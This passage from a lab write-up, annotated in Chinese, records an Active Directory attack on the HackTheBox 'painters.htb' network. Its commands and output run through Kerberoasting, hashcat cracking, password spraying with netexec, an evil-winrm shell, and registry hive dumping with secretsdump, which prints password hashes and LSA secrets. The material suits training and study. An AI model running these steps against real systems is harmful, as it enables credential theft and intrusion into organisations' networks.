2026/03/20 12:48:39 >  Done! Tested 5 usernames (4 valid) in 0.003 seconds
```

> **Kerbrute 是通过 Kerberos 协议的“认证反馈差异”来判断用户是否存在**
>
> **Kerbrute 利用的是：  Kerberos 认证（88端口）**
>
> ** 用户存在  → 返回：PREAUTH REQUIRED（需要预认证）**
>
> ** 用户不存在  → 返回：USER DOES NOT EXIST**
>

## AS-REP Roasting(失败)
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-GetNPUsers -dc-ip 192.168.110.55 PAINTERS/ -usersfile usersname
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User matt@PAINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User daniel@PAINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User blake@PAINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User riley@PAINTERS doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## Kerberoast
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-GetUserSPNs painters.htb/riley:'P@ssw0rd' -dc-ip 192.168.110.55 -request
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName   Name     MemberOf  PasswordLastSet             LastLogon                   Delegation  
---------------------  -------  --------  --------------------------  --------------------------  -----------
HTTP/dc.painters.htb   blake              2026-03-20 20:41:03.143047  2026-03-20 20:46:46.127380  constrained 
HTTP/svc.painters.htb  web_svc            2023-05-24 14:50:47.043365  2022-03-10 03:43:24.961963              



[-] CCache file is not found. Skipping...
$krb5tgs$23$*blake$PAINTERS.HTB$painters.htb/blake*$cc66fe8f225399ed8bcb8810225184d6$d0c29c0fa286df1f8c82e1aee80d5e0bb5bfca83bc4c108b49366786386c9f95e846f27f26ebff4522ebb737a4c015986e3d78505cf6dc3c9408a94396948f69a93e66d6cb652ada8ea9f3f7c0eb18b6731284dc421664792e781c8e1191fade796bc4a6d0541f8923fef08e5a161208bbb0a9ae4cc59ae4b70513af541812df0940f0618cc9c1648978a37fa80053ac13d508c05f9f535ead2d026be097afede43d1de99ef71bdde0d8786cc52882dfe910ce4e5810a2a85831702c30ea586ba1c9a0aadbf96b694fbcbb02fbdde9eade1344842ff76726689d7d7eea03693cd84ef1c4bf99df3fafbcb66c86cf1b94d4269cca6e04bdcee39d85660105d987ee8071fa5a7f892eb3bdf9b489039d9bedb334a1d402f4db73e2b13821d73ccc3f36696e009ab87f14fc6aeaf926cf20c42da0823bf3551acdfd41afd241d926fe010215fe18b43829709ed917786f2a35a9eac2aeec7fad356ed9757073dc62e7916d20cf744ac0ac3c202a3de7ca8088d1ad793b54a5993efcfd53307d5590fc4d88429f4ef298d14ec59c99ad4428f1d60d479d26d40304bdc8ead120ade86e97312472d50fe8651dd2e8d0cc19d027451ae550634ddcb4c6124d2bbe650c0da266f0a02aa75dc114483af97fecd89be3e238bb0d059ecfad72d21814329a1f06f0ab7579ee44fed5cd476b0a5d50f9623e9b35b81892d0826abc85b64258a3cf4a29aa93ee90545b8acf3342c99eb3cfba945baa73416ea718b17f863efc0e247b35ad6b99431c0bca3446d9bd21e5113638a412fb50aa4e0926f560cebcf74ed60680cc561695a88330f9de445d92af334bd970abed179bf469f4065c4da4cffe19a04360721996bbe02408967030e47b9badbc14cf5c5b87c102e906e42e3857db8ee4a7a3a730d41a81db46e86e1cfb003df3f7571a989cea1b3137744a20fe99a15dd81105afc3ad394fb95acab49c9ef563351968457dd6702fb98c085ae8a83f6bc65ce87114b62a3d0f22dbd31f4434d961255a7012a910f98a1a9b96f50ac1a59bbb51fc8e6a76233bd5f899957267941bfce5388a2c815eace5741f4d479d52c78e645c601b9a2719fb189fd0688d5edc8a25153a76d0a2483549c3cdc13f0870cb2b51b5f126dbfe32195f91fe8f5fd32a8f28f0d1f543720240c9b82c6ac2777fcfbf74c5ce71cd1f359683b7d6f7285592d93e99f9192b1e1bf3954ec56bab49c211de9795fe284ddd469bac648701f18859db140b9b08265e87838261e28af2869f7bdce5668f64d85d5f84afc563c6f1cd763e5019ccb843b5ac0456ead0f39191875f478d8b6e1b889369257a443279b3d2ec2a6464775618f1a43e2dc6a97c75e49e20c6b7ffca9735b85fb3f1b740c6b0510e8388e19fac689289951de452942225229a4f820fbbeefe0263831c4a3fb28929ba5d942606321ff8acf414e7ec
$krb5tgs$23$*web_svc$PAINTERS.HTB$painters.htb/web_svc*$d14ad977e84f7fbc0b6c98217e9e16b4$f140dfd216a15390832329879cd00d0f1b2f4627a4f01b24eed1a88f02393076b5bbe310fd01e0d1a532620db12b1583fb90b0902d0bd8832f26fd5c7d075d55e3d028d13570028098ead54833f30644b86269b7d2502c0fbc239b552c137e841652fdfd0fafb60490a602e3bda68ea908386c830d576652437fe805bb285f2cb2f7db255cb016c25a1894adb0b600b87b69153f85bb1d237da1928bf74b93c1e4729fafc3195f58c37cbd3a6431a735840c924a3c7e992b13e23fcb2a2c11fefc04f877eaf9479268bbef30c6a366b1f23efca6635d3e0bc1a04ab9790a55e80473735b9496a45b1057d55bbe4410b2fe2e2dfc64735eddc8483b7cd9e5c7e80e8561220e46492133bae2209f660537dabdb6a1a8d44fef0573d7ca32bff0dafed015d145e2712c64c3fc8abc195260be42dc6b99a8812aceeb1c70a6c6bdd59c814450f81b1b7ea36e543890795fddac106dca1b5516de495016ece40ba7eeced5ba0bff9d17a4b585e3a53a8ed911f4ee859889d56231c779aa682dd0b674646301ed50201accefe8794a6550f7dd21c0c4d7f99ad5dbb40e75a6a3eff697bf3f04a063e423348ed037e54d3ff223a67e5ed5f3318cbb9f4c7b23cf29744e37b64ac2735f7cf015f778544749e65f31d2b609c9fee0a802faf9a28f595a09ad7ffb3088aab584edee8a479e359253367d91347cf4d387cbbd4595d9114e229b233ed06d518fc6249190a2991730351198c1c85db64e28f6561f76804df4487782ba741aa7afe4fa4675ee2f0a08e5d28c1b6b7d38d242f68536842ca058e3cc9d3e5358af51e62345a0a628a39db66a07b2f7c06f100ee756662bd4a38f51aea83314f05ca4766a261d962c83c133fee2908f96cebf52f59930a43982d828bbf721b1b18b0a16fd8daed47e6b3481aaf57f27c9a7fdf04ef58be5d0c9a14bb9dc67b7db0a5b3ed6f27d9f55397d66d5ef1b994baafffde123854cb7529158cd5583249266466fc316bbd23c0ffeb3ead56cf5348433d25d911c8f8ffac5be288f2ed8f529ed081a6caab2751dd92b3e126d6a7c73c41eea724ff6ce9364b842de226539b75b6c912c4ff67d508e561e099a6f88c0b4baf6c889a2fda1bc59529c459f351e27f45738c62ea738e698dd9a372d2f0c6711c4bce412cac4ea4333c7db2f70857727695da097217d13f2b565d1e5ebd5167b01a4c2283e868115271d9151d3f471c6d3862b590d7802ec80efffd0c2c97ca6f35d875f5c22adfc1aba9d4985ed9fcff86a50007845e0fb5b7e1b74240ddb3e5a22dafa547080a279df2631fb57be46d5b38b792d4bd9c8a7e1b81ad358baa32461c9c8b587671305d1a4885663037420ae6c0f52b7f684a3c02e5a888dc5556fdfba89bc6e1edd6ae6ac7c31e1e679047e1207d88ebb66ad8414b83e546565ca75ca50ce8528bc05d47829a1da4b79b43b
```

| 部分 | 含义 |
| --- | --- |
| painters.htb | 域名 |
| riley | 用户 |
| 'P@ssw0rd' | 密码 |
| -dc-ip | 指定域控 |
| -request | 请求票据（Kerberoasting） |


## hashcat
### crack
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# hashcat -m 13100 kerhash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: kerhash
Time.Started.....: Fri Mar 20 21:04:02 2026 (8 secs)
Time.Estimated...: Fri Mar 20 21:04:10 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1725.8 kH/s (1.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
Rejected.........: 0/28688770 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 57%

Started: Fri Mar 20 21:04:00 2026
Stopped: Fri Mar 20 21:04:12 2026
```

### password
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# hashcat -m 13100 kerhash --show                          
$krb5tgs$23$*web_svc$PAINTERS.HTB$painters.htb/web_svc*$d14ad977e84f7fbc0b6c98217e9e16b4$f140dfd216a15390832329879cd00d0f1b2f4627a4f01b24eed1a88f02393076b5bbe310fd01e0d1a532620db12b1583fb90b0902d0bd8832f26fd5c7d075d55e3d028d13570028098ead54833f30644b86269b7d2502c0fbc239b552c137e841652fdfd0fafb60490a602e3bda68ea908386c830d576652437fe805bb285f2cb2f7db255cb016c25a1894adb0b600b87b69153f85bb1d237da1928bf74b93c1e4729fafc3195f58c37cbd3a6431a735840c924a3c7e992b13e23fcb2a2c11fefc04f877eaf9479268bbef30c6a366b1f23efca6635d3e0bc1a04ab9790a55e80473735b9496a45b1057d55bbe4410b2fe2e2dfc64735eddc8483b7cd9e5c7e80e8561220e46492133bae2209f660537dabdb6a1a8d44fef0573d7ca32bff0dafed015d145e2712c64c3fc8abc195260be42dc6b99a8812aceeb1c70a6c6bdd59c814450f81b1b7ea36e543890795fddac106dca1b5516de495016ece40ba7eeced5ba0bff9d17a4b585e3a53a8ed911f4ee859889d56231c779aa682dd0b674646301ed50201accefe8794a6550f7dd21c0c4d7f99ad5dbb40e75a6a3eff697bf3f04a063e423348ed037e54d3ff223a67e5ed5f3318cbb9f4c7b23cf29744e37b64ac2735f7cf015f778544749e65f31d2b609c9fee0a802faf9a28f595a09ad7ffb3088aab584edee8a479e359253367d91347cf4d387cbbd4595d9114e229b233ed06d518fc6249190a2991730351198c1c85db64e28f6561f76804df4487782ba741aa7afe4fa4675ee2f0a08e5d28c1b6b7d38d242f68536842ca058e3cc9d3e5358af51e62345a0a628a39db66a07b2f7c06f100ee756662bd4a38f51aea83314f05ca4766a261d962c83c133fee2908f96cebf52f59930a43982d828bbf721b1b18b0a16fd8daed47e6b3481aaf57f27c9a7fdf04ef58be5d0c9a14bb9dc67b7db0a5b3ed6f27d9f55397d66d5ef1b994baafffde123854cb7529158cd5583249266466fc316bbd23c0ffeb3ead56cf5348433d25d911c8f8ffac5be288f2ed8f529ed081a6caab2751dd92b3e126d6a7c73c41eea724ff6ce9364b842de226539b75b6c912c4ff67d508e561e099a6f88c0b4baf6c889a2fda1bc59529c459f351e27f45738c62ea738e698dd9a372d2f0c6711c4bce412cac4ea4333c7db2f70857727695da097217d13f2b565d1e5ebd5167b01a4c2283e868115271d9151d3f471c6d3862b590d7802ec80efffd0c2c97ca6f35d875f5c22adfc1aba9d4985ed9fcff86a50007845e0fb5b7e1b74240ddb3e5a22dafa547080a279df2631fb57be46d5b38b792d4bd9c8a7e1b81ad358baa32461c9c8b587671305d1a4885663037420ae6c0f52b7f684a3c02e5a888dc5556fdfba89bc6e1edd6ae6ac7c31e1e679047e1207d88ebb66ad8414b83e546565ca75ca50ce8528bc05d47829a1da4b79b43b:!QAZ1qaz
```

得到凭据web_svc/!QAZ1qaz

## netexec-web_svc
### smb
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q nxc smb 192.168.110.1/24 -u web_svc -p '!QAZ1qaz'
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:painters.htb) (signing:False) (SMBv1:None)
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:painters.htb) (signing:False) (SMBv1:None)
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.110.53  445    PNT-SVRBPA       [+] painters.htb\web_svc:!QAZ1qaz 
SMB         192.168.110.52  445    PNT-SVRSVC       [+] painters.htb\web_svc:!QAZ1qaz (Pwn3d!)
SMB         192.168.110.55  445    DC               [+] painters.htb\web_svc:!QAZ1qaz 
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q nxc winrm 192.168.110.1/24 -u web_svc -p '!QAZ1qaz'
WINRM       192.168.110.55  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:painters.htb)
WINRM       192.168.110.53  5985   PNT-SVRBPA       [*] Windows Server 2022 Build 20348 (name:PNT-SVRBPA) (domain:painters.htb)
WINRM       192.168.110.52  5985   PNT-SVRSVC       [*] Windows Server 2022 Build 20348 (name:PNT-SVRSVC) (domain:painters.htb)
WINRM       192.168.110.56  5985   WORKSTATION-1    [*] Windows 10 / Server 2019 Build 19041 (name:WORKSTATION-1) (domain:painters.htb)
WINRM       192.168.110.54  5985   PNT-SVRPSB       [*] Windows Server 2022 Build 20348 (name:PNT-SVRPSB) (domain:painters.htb)

WINRM       192.168.110.55  5985   DC               [-] painters.htb\web_svc:!QAZ1qaz

WINRM       192.168.110.53  5985   PNT-SVRBPA       [-] painters.htb\web_svc:!QAZ1qaz

WINRM       192.168.110.52  5985   PNT-SVRSVC       [+] painters.htb\web_svc:!QAZ1qaz (Pwn3d!)

WINRM       192.168.110.56  5985   WORKSTATION-1    [-] painters.htb\web_svc:!QAZ1qaz

WINRM       192.168.110.54  5985   PNT-SVRPSB       [-] painters.htb\web_svc:!QAZ1qaz
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

## Rustscan
### upload
```plain
scp /home/kali/Desktop/tools/rustscan/rustscan riley@10.10.110.35:/tmp/
```

### scan
```plain
cd /tmp
chmod 777 rustscan
./rustscan -a 192.168.110.52,192.168.110.53,192.168.110.54,192.168.110.55,192.168.110.56
```

```plain
riley@mail:/tmp$ ./rustscan -a 192.168.110.52,192.168.110.53,192.168.110.54,192.168.110.55,192.168.110.56
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Because guessing isn't hacking.

[~] The config file is expected to be at "/home/riley/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.110.55:53
Open 192.168.110.55:88
Open 192.168.110.55:135
Open 192.168.110.53:135
Open 192.168.110.52:135
Open 192.168.110.55:139
Open 192.168.110.56:135
Open 192.168.110.53:139
Open 192.168.110.52:139
Open 192.168.110.55:389
Open 192.168.110.53:445
Open 192.168.110.52:445
Open 192.168.110.55:445
Open 192.168.110.55:464
Open 192.168.110.55:593
Open 192.168.110.55:636
Open 192.168.110.55:3268
Open 192.168.110.55:3269
Open 192.168.110.56:5040
Open 192.168.110.52:5985
Open 192.168.110.53:5985
Open 192.168.110.54:5985
Open 192.168.110.55:5985
Open 192.168.110.56:5985
Open 192.168.110.56:7680
Open 192.168.110.55:9389
Open 192.168.110.55:10050
Open 192.168.110.55:49664
Open 192.168.110.55:49667
Open 192.168.110.55:49668
Open 192.168.110.55:55571
Open 192.168.110.55:55863
Open 192.168.110.55:55868
Open 192.168.110.55:55876
```

## Port Collate
### 192.168.110.55-DC
| 端口 | 服务 |
| --- | --- |
| 53 | DNS |
| 88 | Kerberos |
| 135 | RPC |
| 139 | SMB |
| 389 | LDAP |
| 445 | SMB |
| 464 | Kerberos pwd |
| 593 | RPC over HTTP |
| 636 | LDAPS |
| 3268 | Global Catalog |
| 3269 | GC SSL |
| 5985 | WinRM |
| 9389 | AD Web Services |
| 10050 | Zabbix agent |
| 高端口 | RPC 动态端口 |


---

### 192.168.110.52-PNT-SVRSVC
| 端口 | 服务 |
| --- | --- |
| 135 | RPC |
| 139 | SMB |
| 445 | SMB |
| 5985 | WinRM |


---

### 192.168.110.53-PNT-SVRBPA
| 端口 | 服务 |
| --- | --- |
| 135 | RPC |
| 139 | SMB |
| 445 | SMB |
| 5985 | WinRM |


---

### 192.168.110.54-PNT-SVRPSB
| 端口 | 服务 |
| --- | --- |
| 5985 | WinRM |


---

### 192.168.110.56-WORKSTATION-1
| 端口 | 服务 |
| --- | --- |
| 135 | RPC |
| 5040 | 未知（WMI/服务） |
| 5985 | WinRM |
| 7680 | Delivery Optimization |


---

# WORKSTATION-1\riley-192.168.110.56
## netexec-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q netexec winrm 192.168.110.1/24 -u "riley" -p 'P@ssw0rd'
WINRM       192.168.110.53  5985   PNT-SVRBPA       [*] Windows Server 2022 Build 20348 (name:PNT-SVRBPA) (domain:painters.htb)
WINRM       192.168.110.55  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:painters.htb)
WINRM       192.168.110.56  5985   WORKSTATION-1    [*] Windows 10 / Server 2019 Build 19041 (name:WORKSTATION-1) (domain:painters.htb)
WINRM       192.168.110.52  5985   PNT-SVRSVC       [*] Windows Server 2022 Build 20348 (name:PNT-SVRSVC) (domain:painters.htb)
WINRM       192.168.110.54  5985   PNT-SVRPSB       [*] Windows Server 2022 Build 20348 (name:PNT-SVRPSB) (domain:painters.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.53  5985   PNT-SVRBPA       [-] painters.htb\riley:P@ssw0rd
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.55  5985   DC               [-] painters.htb\riley:P@ssw0rd
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.56  5985   WORKSTATION-1    [+] painters.htb\riley:P@ssw0rd (Pwn3d!)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.52  5985   PNT-SVRSVC       [-] painters.htb\riley:P@ssw0rd
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.54  5985   PNT-SVRPSB       [-] painters.htb\riley:P@ssw0rd
```

## evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q evil-winrm -i 192.168.110.56 -u 'riley' -p 'P@ssw0rd'    
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\riley\Documents>whoami
workstation-1\riley
```

## whoami
```plain
*Evil-WinRM* PS C:\Users\riley\Desktop> whoami
workstation-1\riley
```

### groups
```plain
*Evil-WinRM* PS C:\Users\riley\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

### priv
```plain
*Evil-WinRM* PS C:\Users\riley\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
```

## Getflag
```plain
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
ZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}
```

## mimikatz(失败)
### upload
```plain
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe mimikatz.exe
                                        
Info: Uploading /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe to C:\Users\Public\mimikatz.exe
                                        
Data: 1666740 bytes of 1666740 bytes copied
                                        
Info: Upload successful!
```

### run(失败)
```plain
*Evil-WinRM* PS C:\Users\riley\Documents> .\mimikatz.exe
Program 'mimikatz.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\mimikatz.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ .\mimikatz.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

## secretsdump
### Remote(失败)
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-secretsdump 'painters.htb/riley:P@ssw0rd@192.168.110.56'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: [Errno Connection error (192.168.110.56:445)] [Errno 111] Connection refused
[*] Cleaning up... 
```

### Save
```plain
*Evil-WinRM* PS C:\Users\Public> reg save HKLM\SAM C:\Users\Public\sam.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Public> reg save HKLM\SYSTEM C:\Users\Public\system.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Public> reg save HKLM\SECURITY C:\Users\Public\security.save
The operation completed successfully.
```

### Download
```plain
download 'C:\Users\Public\sam.save' '/home/kali/Desktop/htb/zephyr/sam.save'                                   
download 'C:\Users\Public\system.save' '/home/kali/Desktop/htb/zephyr/system.save'
download 'C:\Users\Public\security.save' '/home/kali/Desktop/htb/zephyr/security.save'
```

### Crack
```plain
# 使用 impacket-secretsdump 离线提取哈希
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x1c23db3f663f7eaa09f56f73ed75d1fd
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8092020c9064687611cf5869fbed0bed:::
riley:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
[*] Dumping cached domain logon information (domain/username:hash)
PAINTERS.HTB/riley:$DCC2$10240#riley#531607eb35dd3199fa1b6b94143721f3: (2026-03-20 03:45:52+00:00)
PAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2024-12-12 11:57:16+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:618ce11ca362df1897716244dd3dac6fbaeea09fd82046f84082826e774a9933b1f0e0b5558b95b86c7df9f4655164cf6c2dc6aa0db3d3fbdacdb645d7b2dc9cf4992893e0a9d0e75277f6b79524e4a4ae43f5cace973d8f68aff5d565eea5f8817ec0a8ea2dff9892c06d18d23e1d77c23a0d85c6402c5eec29d80b483d2e6f43be258a494ff29395498998bd8bc66462699a3173263326564af0a7ad7c34a6b3dc3fa80fde8d4f719907a46af640e750f447ecc0e10ed96ffdcbbb3c8b76bbee9bcc40a4279909b9d2330c266a36c1dde81f53da399fae28681a737fd83d539c3a007d6dec170bd8348e3999fa4db7
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ab46ef513f6f74ddf1ab492b8f542fa
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x95e1502369d9af8422e0dacced108a7f42cf26e5
dpapi_userkey:0x57e21518bafd3ea29c99643f9b8d293254df40ef
[*] NL$KM 
 0000   5C 47 D5 7D D7 A5 C5 4A  50 85 AB 7C 93 62 01 94   \G.}...JP..|.b..
 0010   AF C9 C5 0B BC 23 6A 79  62 93 24 D2 C6 CC 11 07   .....#jyb.$.....
 0020   66 E2 BD 9C FB 21 B7 45  14 A7 57 E8 11 63 FB 30   f....!.E..W..c.0
 0030   50 77 F8 7E D6 67 7A 69  61 94 58 9E 35 B1 2A A3   Pw.~.gzia.X.5.*.
NL$KM:5c47d57dd7a5c54a5085ab7c93620194afc9c50bbc236a79629324d2c6cc110766e2bd9cfb21b74514a757e81163fb305077f87ed6677a696194589e35b12aa3
[*] Cleaning up... 
```

# painters\web_svc-192.168.110.52
## netexec-riley
### smb
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q nxc smb 192.168.110.1/24 -u web_svc -p '!QAZ1qaz'
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:painters.htb) (signing:False) (SMBv1:None)
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:painters.htb) (signing:False) (SMBv1:None)
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.110.53  445    PNT-SVRBPA       [+] painters.htb\web_svc:!QAZ1qaz 
SMB         192.168.110.52  445    PNT-SVRSVC       [+] painters.htb\web_svc:!QAZ1qaz (Pwn3d!)
SMB         192.168.110.55  445    DC               [+] painters.htb\web_svc:!QAZ1qaz 
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### winrm
```plain
